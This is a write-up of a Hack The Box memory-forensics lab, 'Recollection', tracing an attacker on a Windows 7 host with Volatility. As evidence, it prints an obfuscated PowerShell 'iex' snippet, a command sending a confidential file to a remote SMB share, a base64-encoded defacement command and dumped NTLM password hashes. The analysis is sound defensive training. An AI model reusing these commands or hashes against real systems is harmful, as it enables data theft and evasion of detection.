---
title: "Hack The Box: Recollection"
date: 2026-08-11
summary: "An Easy Windows defensive lab focused on memory forensics using Volatility to analyze a memory dump (recollection.bin) from a compromised Windows 7 host. The investigation uncovers obfuscated PowerShell commands in the clipboard, unauthorized exfiltration attempts via SMB, drops of defacement notes, typosquatted binaries, and threat actor indicators including VirusTotal metadata and email artifacts."
platform: "Hack The Box"
type: "Defensive Lab"
os: "Windows"
difficulty: "Easy"
link: "https://app.hackthebox.com/sherlocks/Recollection"
tags:
  - digital-forensics
  - easy
  - htb
  - memory-forensics
  - virustotal
  - volatility
  - windows
---

## Executive Summary

Digital forensics and memory analysis of `recollection.bin` from host `USER-PC` (IP `192.168.0.104`), an unpatched Windows 7 SP1 x64 environment, confirmed active compromise and unauthorized adversary activity. The threat actor executed malicious binaries from the `Downloads` directory, including a typosquatted binary mimicking core system processes (`csrsss.exe`) and a malicious payload identified by its SHA-256 hash (`b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe`). To bypass basic string-matching security controls, the attacker staged an obfuscated PowerShell snippet via the Windows clipboard (`(gv '*MDR*').naMe[3,11,2]-joIN''`) to dynamically invoke `Invoke-Expression` (`iex`). The actor subsequently attempted to exfiltrate sensitive data by issuing a command (`type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`) to redirect contents to an unauthorized external SMB share, which failed due to an invalid network path error (`The network path was not found`). Finally, a base64-encoded command dropped a defacement note at `C:\Users\Public\Office\readme.txt` containing `"hacked by mafia"`, with memory artifacts linking the activity to the email address `mafia_code1337@gmail.com`.

## Scenario

A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below.

## Provided Artifacts

`recollection.bin` (SHA256: `a3e2f3a39beee513246494604b529c0a318c981148c58eb4a2fb7591ade786f7`)

## Tasks

### Task 1

***Question: What is the Operating System of the machine?***

Given that the provided binary file is a memory file, let’s analyze it with `volatility` to extract system information.

Since the operating system’s vendor isn’t known, it is safe to start with the assumption that it is a Windows machine, and use the `windows.info` module:

```bash
$ vol -f recollection.bin windows.info
Volatility 3 Framework 2.28.0
Progress:  100.00		PDB scanning finished                        
Variable	Value

Kernel Base	0xf8000285c000
DTB	0x187000
Symbols	file:<SNIP>
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 FileLayer
KdDebuggerDataBlock	0xf80002a3f120
NTBuildLab	7601.24214.amd64fre.win7sp1_ldr_
CSDVersion	1
KdVersionBlock	0xf80002a3f0e8
Major/Minor	15.7601
MachineType	34404
KeNumberProcessors	1
SystemTime	2022-12-19 16:07:30+00:00
NtSystemRoot	C:\Windows
NtProductType	NtProductWinNt
NtMajorVersion	6
NtMinorVersion	1
PE MajorOperatingSystemVersion	6
PE MinorOperatingSystemVersion	1
PE Machine	34404
PE TimeDateStamp	Thu Aug  2 02:18:10 2018
```

The `NtMajorVersion` (6) and `NtMinorVersion` (1) values indicate NT kernel 6.1, which narrows the OS down to either Windows 7 or Windows Server 2008 R2. The `NtProductType` value of `NtProductWinNt` identifies it as a workstation build rather than a server build, confirming the operating system is Windows 7.

***Answer: Windows 7***

### Task 2

***Question: When was the memory dump created?***

The output of the analysis made in Task 1 shows the time value when the dump was created.

***Answer: 2022-12-19 16:07:30***

### Task 3

***Question: After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?***

To solve this task, let’s revert back to Volatility 2 and use its clipboard module:

```bash
$ ./vol2 -f recollection.bin --profile=Win7SP1x64 clipboard
Volatility Foundation Volatility Framework 2.6
Session    WindowStation Format                         Handle Object             Data                                              
---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''                  
         1 WinSta0       CF_TEXT                  0x7400000000 ------------------                                                   
         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260                                                   
         1 WinSta0       0x0L                              0x0 ------------------
```

Notice the `(gv '*MDR*').naMe[3,11,2]-joIN''` section. It represents the following:

- **`gv '*MDR*'`**: Alias for `Get-Variable '*MDR*'`. In a default PowerShell session, this matches the automatic variable `$MaximumDriveCount`.
- **`.naMe`**: Retrieves the string name of the variable, which is `"MaximumDriveCount"`.
- **`[3,11,2]`**: Extracts characters at specific 0-based array indices from the string `"MaximumDriveCount"`:
    - Index 3 = **`i`**
    - Index 11 = **`e`**
    - Index 2 = **`x`**
- **`joIN''`**: Joins the array `['i', 'e', 'x']` into a single string: **`iex`**.

So this is an obfuscation used to call the `iex` command.

***Answer: `(gv 'MDR').naMe[3,11,2]-joIN''`***

### Task 4

***Question: The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?***

As mentioned in the details from the previous task, the attacker is trying to obfuscate the `iex` alias, which corresponds to the `Invoke-Expression` cmdlet.

***Answer: `Invoke-Expression`***

### Task 5

***Question: A CMD command was executed to attempt to exfiltrate a file. What is the full command line?***

By using the `cmdscan` module in Volatility 2, we can identify the commands ran and their flags:

```bash
$ ./vol2 -f recollection.bin --profile=Win7SP1x64 cmdscan
Volatility Foundation Volatility Framework 2.6
<SNIP>
**************************************************
CommandProcess: conhost.exe Pid: 3524
CommandHistory: 0xbef50 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 6 LastAdded: 5 LastDisplayed: 5
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0xdc
Cmd #0 @ 0xc71c0: type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
Cmd #1 @ 0xbf230: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #2 @ 0x9d1a0: powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #3 @ 0xc72a0: cd .\Downloads
Cmd #4 @ 0xbdf10: ls
Cmd #5 @ 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
**************************************************
<SNIP>
```

Notice the first ran CMD command, it clearly shows signs of a data exfiltration attempt.

***Answer: `type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`***

### Task 6

***Question: Following the above command, now tell us if the file was exfiltrated successfully?***

To verify whether the scan was successful or not, let’s use the `consoles` module by Volatility 2, which dumps the entire buffer associated with commands ran (including `stdout` and `stderr`), to check the response of the system after the command was ran:

```bash
$ ./vol2 -f recollection.bin --profile=Win7SP1x64 consoles
Volatility Foundation Volatility Framework 2.6
**************************************************
<SNIP>
PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
\pulice\pass.txt                                                                
The network path was not found.                                                 
At line:1 char:47                                                               
+ type C:\Users\Public\Secret\Confidential.txt > <<<<  \\192.168.0.171\pulice\p 
ass.txt                                                                         
    + CategoryInfo          : OpenError: (:) [], IOException                    
    + FullyQualifiedErrorId : FileOpenFailure                                   
<SNIP>
```

As seen, the system didn’t recognize the network path specified, so the command failed.

***Answer: No***

### Task 7

***Question: The attacker tried to create a readme file. What was the full path of the file?***

After decoding the contents of the base64 encoded text found in Task 5, the output reveals a readme file created in a specific location:

```bash
$ echo 'ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi' | base64 -d
echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
```

***Answer: `C:\Users\Public\Office\readme.txt`***

### Task 8

***Question: What was the Host Name of the machine?***

The hostname is usually found in the environment variables of the system, which can be extracted using the `envars` module in Volatility 3:

```bash
$ vol -f recollection.bin windows.envars | grep -i COMPUTERNAME
376gresswininit.exe	0x3618f0PDB scanCOMPUTERNAME	USER-PC
428	winlogon.exe	0x1e18f0	COMPUTERNAME	USER-PC
472	services.exe	0x61c30	COMPUTERNAME	USER-PC
480	lsass.exe	0xe1c30	COMPUTERNAME	USER-PC
488	lsm.exe	0x201c30	COMPUTERNAME	USER-PC
596	svchost.exe	0x311d70	COMPUTERNAME	USER-PC
672	svchost.exe	0x441df0	COMPUTERNAME	USER-PC
764	svchost.exe	0x2a1df0	COMPUTERNAME	USER-PC
804	svchost.exe	0x291d70	COMPUTERNAME	USER-PC
832	svchost.exe	0x231df0	COMPUTERNAME	USER-PC
856	svchost.exe	0x1d1d70	COMPUTERNAME	USER-PC
288	svchost.exe	0x2e1df0	COMPUTERNAME	USER-PC
1116	spoolsv.exe	0x291d70	COMPUTERNAME	USER-PC
1144	svchost.exe	0x71df0	COMPUTERNAME	USER-PC
1220	svchost.exe	0x381d70	COMPUTERNAME	USER-PC
1248	svchost.exe	0x2d1df0	COMPUTERNAME	USER-PC
1960	taskhost.exe	0x391d70	COMPUTERNAME	USER-PC
2012	dwm.exe	0x3f1d70	COMPUTERNAME	USER-PC
2032	explorer.exe	0x1b1da0	COMPUTERNAME	USER-PC
1784	SearchIndexer.	0x3a1d70	COMPUTERNAME	USER-PC
2380	msedge.exe	0x921e10	COMPUTERNAME	USER-PC
2396	msedge.exe	0x8e1ed0	COMPUTERNAME	USER-PC
2588	msedge.exe	0xb91ff0	COMPUTERNAME	USER-PC
2680	msedge.exe	0x81ff0	COMPUTERNAME	USER-PC
2752	msedge.exe	0xa720a0	COMPUTERNAME	USER-PC
3032	msedge.exe	0x9220a0	COMPUTERNAME	USER-PC
1572	sppsvc.exe	0x2e1df0	COMPUTERNAME	USER-PC
2652	wmpnetwk.exe	0x391df0	COMPUTERNAME	USER-PC
980	msedge.exe	0x9a20a0	COMPUTERNAME	USER-PC
3336	wuauclt.exe	0x3f1d70	COMPUTERNAME	USER-PC
4052	cmd.exe	0x201db0	COMPUTERNAME	USER-PC
3688	powershell.exe	0x311e00	COMPUTERNAME	USER-PC
3532	powershell.exe	0x131e10	COMPUTERNAME	USER-PC
3476	notepad.exe	0x411db0	COMPUTERNAME	USER-PC
2060	msedge.exe	0xb020a0	COMPUTERNAME	USER-PC
3268	taskeng.exe	0x411d70	COMPUTERNAME	USER-PC
3560	msedge.exe	0xa220a0	COMPUTERNAME	USER-PC
2160	msedge.exe	0xad20a0	COMPUTERNAME	USER-PC
```

***Answer: `USER-PC`***

### Task 9

***Question: How many user accounts were in the machine?***

User accounts can be identified using the `hashdump` module in Volatility 2, so let’s use it:

```bash
$ ./vol2 -f recollection.bin --profile=Win7SP1x64 hashdump
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:10eca58175d4228ece151e287086e824:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:5915a7959c04d8560468296edaefbc9b:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:cb6003ecf6b98b5f7fbbb03df798ac76:::
```

By excluding the local service account `HomeGroupUser$`, we are left with 3 users.

***Answer: 3***

### Task 10

***Question: In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?***

We can use the `filescan` module in Volatility 2 and grep for the passwords file to identify the path:

```bash
$ ./vol2 -f recollection.bin --profile=Win7SP1x64 filescan | grep -i "passwords.txt"
Volatility Foundation Volatility Framework 2.6
0x000000011fc10070      1      0 R--rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
```

***Answer: `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`***

### Task 11

***Question: A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?***

By checking the command ran in CMD #5 identified in Task 5, it looks like an executable file whose name is a hash value:

```bash
<SNIP>
Cmd #5 @ 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
<SNIP>
```

VirusTotal confirms this:

![Figure 1](/assets/images/writeups/hack-the-box-recollection/hack-the-box-recollection-fig-1.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

***Answer: `b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1`***

### Task 12

***Question: Following the previous question, what is the Imphash of the malicous file you found above?***

VirusTotal clearly logs this value, as seen in Figure 1.

***Answer: `d3b592cd9481e4f053b5362e22d61595`***

### Task 13

***Question: Following the previous question, tell us the date in UTC format when the malicious file was created?***

This can be identified in the History section under the Details tab in VirusTotal:

![Figure 2](/assets/images/writeups/hack-the-box-recollection/hack-the-box-recollection-fig-2.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

***Answer: `2022-06-22 11:49:04`***

### Task 14

***Question: What was the local IP address of the machine?***

This can be identified with the `netstat` module in Volatility 3:

```bash
$ vol -f recollection.bin windows.netscan | grep -vE '0.0.0.0|127.0.0.1|::'
Volatility 3 Framework 2.28.0	PDB scanning finished                        

Offset	Proto	LocalAddr	LocalPort	ForeignAddr	ForeignPort	State	PID	Owner	Created

0x11dc079d0	TCPv4	192.168.0.104	49315	13.33.88.81	443	ESTABLISHED	-	-	N/A
0x11e3b2bf0	UDPv4	192.168.0.104	138	*	0		4	System	2022-12-19 15:32:47.000000 UTC
0x11e3b40e0	UDPv4	192.168.0.104	137	*	0		4	System	2022-12-19 15:32:47.000000 UTC
0x11e957cc0	UDPv4	192.168.0.104	1900	*	0		1248	svchost.exe	2022-12-19 15:34:44.000000 UTC
0x11f8395c0	TCPv4	192.168.0.104	49323	199.232.46.132	443	ESTABLISHED	-	-	N/A
0x11fa38010	UDPv4	192.168.0.104	52222	*	0		2380	msedge.exe	2022-12-19 16:04:36.000000 UTC
0x11fbd4570	TCPv4	192.168.0.104	49340	23.47.190.91	443	ESTABLISHED	-	-	N/A
0x11fbe1010	TCPv4	192.168.0.104	49326	198.144.120.23	80	CLOSED	-	-	-
0x11fd21cd0	TCPv4	192.168.0.104	49341	198.144.120.23	443	CLOSE_WAIT	-	-	N/A
0x11fd4b010	TCPv4	192.168.0.104	49325	198.144.120.23	80	CLOSED	-	-	-
```

All `LocalAddr` fields point to a single private IP address.

***Answer: `192.168.0.104`***

### Task 15

***Question: There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?***

First, let’s use the `psscan` module to identify the PID of all `powershell.exe` processes:

```bash
$ vol -f recollection.bin windows.psscan | grep powershell
3532	4052	powershell.exe	0x11dcbbb00	5	606	1	False	2022-12-19 15:44:44.000000 UTC	N/A	Disabled
3688	2032	powershell.exe	0x11fb6b060	5	367	1	False	2022-12-19 15:43:39.000000 UTC	N/A	Disabled
```

Now let’s check the PIDs that correspond to the two identified PPIDs:

```bash
$ vol -f recollection.bin windows.psscan | grep -E '4052|2032'
3532  4052	powershell.exe	0x11dcbbb00	5	606	1	False	2022-12-19 15:44:44.000000 UTC	N/A	Disabled
2032	1988	explorer.exe	0x11df67060	23	906	1	False	2022-12-19 15:33:13.000000 UTC	N/A	Disabled
2380	2032	msedge.exe	0x11dfe9b00	43	1123	1	False	2022-12-19 15:34:29.000000 UTC	N/A	Disabled
4052	2032	cmd.exe	0x11fabc060	1	23	1	False	2022-12-19 15:40:08.000000 UTC	N/A	Disabled
3688	2032	powershell.exe	0x11fb6b060	5	367	1	False	2022-12-19 15:43:39.000000 UTC	N/A	Disabled
3476	2032	notepad.exe	0x11fbe2750	1	62	1	False	2022-12-19 15:50:42.000000 UTC	N/A	Disabled
```

- PID 3688 (`powershell.exe`) was launched directly from `explorer.exe` (PID 2032) via the desktop GUI.
- PID 3532 (`powershell.exe`) has a PPID of 4052, meaning it was spawned directly inside an active `cmd.exe` session as a child process.

***Answer: `cmd.exe`***

### Task 16

***Question: Attacker might have used an email address to login a social media. Can you tell us the email address?***

Let’s use `strings` to filter for email addresses in the memory dump:

```bash
$ strings -a -e l recollection.bin | grep -E -i "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b" | sort -u
5302@shell32.dll
/7@gmail.co
a_code1337@gmail.com
Cookie:user@ieonline.microsoft.com/
Cookie:user@microsoft.com/
Cookie:user@msn.com/
Cookie:user@www.msn.com/
@For more information regarding OATI certificates and the OATI webCARES System, please see the OATI Certification Practice Statement (CPS) at the following location: http://www.oaticerts.com/repository.  If you have specific questions that cannot be answered by the OATI CPS or would like OATI webCARES product information, please e-mail your requests to OATI at the following address: Customer_Service@oaticerts.com
ieuser@microsoft.com
J.A. Formoso (tfmsts@btconnect.com)
jmctester@fake.chromium.org
	john@contoso.com
jSXO3SB_a3=W88*9cw~unBXQvZCe!53`$B?TEE_sktM&{SB=M4)L-YRw3ad5[[%i`61c{761u$%HuFzu]k&yg5K+h6(pT}QV~&B$-5x)F+R5&6]r1@HjLECX?jW$HN^NG6%^S32krQCj_Y@8N)vj88zVdN5hv'YsNZh*KqDWV6F[J$fF_b[ZCpN%Nr)N)7TpBrMKDxG0_zX.@Q6o05B5gpDXt}i'Rykuv?s%j7NN^CO_fD&2&b!GvE2yc7Z1o`9o+,Etp[TwL~x?d56_&&&UlT5W}8+iY?bPh4hfGGZAIpQCs_)h6xt{,4P$tmuL6!+oXu@ZYfHRO7FNfDJ6D&mI$WWXJQSho437WW[emRWRuMx6W]alW3}-,vx%i+)o8rFBv`^Mj6wVuqGqH79@6S62LO$a(8rCrPfanr$D.$DNJl!c_7TMUvYLV2MFAk%ZB2n=i5&ZJ^TwUj5LmiNs!=J2@5G{W5mme,OH&8'aV9pt}5sp%V$']B&VPv_1Fs2If4F0yF-=6Xx`k$Ilp7K-45=!NXh)WO1%3-jTwC'%j3u7.cdMk'=3[nyIaErap7EC4cNh1E02Rq=F3V*~I4zsaHSOq4?d49gQqJG6q6d})ZfG@GWW!-ojI{)OQ3R)(*tfzH6U_3bEubJ6m7z]SjbeC2_jU(68VW}$Y6s$yFev4~V1`SjL+Q5l}5X]{)y4j+V0fK9FPco8v5AKX.`w_~rp8mjHrFAZC6xAfcPhR=DlW3t2%(Oa74y[,ZB{Z~3R?%K5zIvcR7!ezg=mL{C^}qs5[Uxn?8XU?Hn_qZcxQ-6{8Lw]-6Lm6$g$2hCJQHyfg*!@Y7*.m@9ZuZK_`fk4nbK&`6.dfau{}4NA!x&T[~?&u4hl.m56MSrSpHk$pp7R(5Xp3%PJtfTXzw'$e&%f@7N][te5K?1+dcd_a!TSn7THmtK^euj%u!SZ.94@w7=+Dbj=BuG3SIfB)a}6s5cOv[Eji_DNxe1xsfy?96Nxhd$zdwQxFsQRxlm0F6JRx,J&TWS9By}OaQ?g[3fm9W$*vjzOX@sW5.nW`5YfSqL3a6$667LVo$Al^5{4-,TK1[V.dz6qBS~O-7u-mH,?nb06K)K$^EH8t7Dyh^VHn}v8']2(tbC,m6`@nmHZ*yJ+uv!mwLjO57T!m.EoPLEulTr?&5UvT6MQ^a03rgNFmvgR*W+]S3fnA)yvf&_Jkd1hupJ-m6IcS9)R5T&2+6.id46Fe6U)y?i{Aw{QQ{zR)M2CV8AM)u.Tq2osuM8TPyaJd6V6)w*hS9VC{G^q87rK35TR]L+_@TcDcVW`v}`*$4~UsFEk{iSH-@[~15izZ3&jJWBN2=*gZJ.(OX2X*7R5WJ?u%C_x]3u.D=3%D4z*Q]q{Oe~MH-A?KeXut3^4F&SmxSDD}Dc?_.eY!7mUClWVC`ZpPFMJ'=q_E7bf5fq)jn%$W_ecPG?N%8FL6)Y]V?OsHMWQb'K1q7!6gYoleMKv7F-jBXJ'C4l,?%(F6$pkqC[p4vITn6gISG7pm~CG
*LocalSubnet@FirewallAPI.dll,-28502
*LocalSubnet@FirewallAPI.dll,-30502
*LocalSubnet@FirewallAPI.dll,-30752
*LocalSubnet@FirewallAPI.dll,-31252
*LocalSubnet@FirewallAPI.dll,-31752
*LocalSubnet@peerdistsh.dll,-9001
mafia_code1337@gmail.com
polly.deletable@fake.chromium.org
.polly.disused@fake.chromium.org
someone@Acme.com
```

Many addresses are found, but given the mafia context identified in Task 7, it is safe to say that `mafia_code1337@gmail.com` is the sought-after email.

***Answer: `mafia_code1337@gmail.com`***

### Task 17

***Question: Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution's name?***

Let’s use `strings` to filter for popular SIEM solutions searched for in MS Edge:

```bash
$ strings -a -e l recollection.bin | grep -iE 'edge|bing' | grep -iE 'splunk|wazuh|sentinel|qradar' | sort | uniq
https://www.bing.com/search?q=install+wazuh+agent+windows&cvid=1cd1decfefee44308a6339f7a3e5b860&aqs=edge..69i57j0l6.5579j0j1&FORM=ANNTA1&PC=U531
```

***Answer: Wazuh***

### Task 18

***Question: The victim user downloaded an exe file. The file's name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?***

Let’s check downloaded executable files to identify this typosquatted file using the `filescan` module in Volatility 3:

```bash
$ vol -f recollection.bin windows.filescan | grep -i 'Downloads' | grep -i '\.exe'
0x11e955820100.0\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
0x11fa45c20	\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x11fc1db70	\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x11fd79a90	\Users\user\Downloads\7z2201-x64.exe
0x11fdeb470	\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
```

Notice how the user downloaded a file called `csrsss.exe`, mimicking the real `csrss.exe` executable.

***Answer: `csrsss.exe`***

---

## Business Impact

### Confidentiality

- An explicit attempt was made to exfiltrate the file `Confidential.txt` located in `C:\Users\Public\Secret\`. Console output logs confirmed that the network connection to `\\192.168.0.171\pulice\pass.txt` failed, preventing external file transfer. However, because the attacker held interactive access on the workstation, local exposure of unencrypted files staging in user profiles occurred.

### Integrity

- The threat actor successfully executed unauthorized code, staged malicious binaries (`csrsss.exe`, `b0ad7041...exe`), and dynamically altered shell behavior using obfuscated PowerShell scripts. System state integrity was compromised through arbitrary file creation (`C:\Users\Public\Office\readme.txt`) and administrative command executions within active command shells (`cmd.exe` PID 4052 spawning `powershell.exe` PID 3532).

### Availability

- No immediate destructive payloads (e.g., ransomware or disk wipers) were activated during the captured memory state, and service availability was not disrupted. However, hosting an unmonitored and outdated Windows 7 asset on the network creates systemic risk, as unpatched vulnerabilities can be leveraged for wider lateral movement and service disruption across connected internal infrastructure.

## Remediation

- **Host Isolation:** Immediately remove `USER-PC` (`192.168.0.104`) from the physical/virtual network to prevent potential lateral movement or persistent Command & Control (C2) communication.
- **Credential Revocation:** Reset credentials for all local accounts identified on the machine (`Administrator`, `user`, `Guest`) and force a session logoff across connected services.
- **Indicator Blocking (IoCs):** Deploy the following indicators to perimeter firewalls, EDR/AV solutions, and network filters:
    - **Host IP / Share:** `192.168.0.171`
    - **SHA-256 Hash:** `b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1`
    - **Imphash:** `d3b592cd9481e4f053b5362e22d61595`
    - **File Indicators:** `csrsss.exe`, `C:\Users\Public\Office\readme.txt`
    - **Email Tag:** `mafia_code1337@gmail.com`
